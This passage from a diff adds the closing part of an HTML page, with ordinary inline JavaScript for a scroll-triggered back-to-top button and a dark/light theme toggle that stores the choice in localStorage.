+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
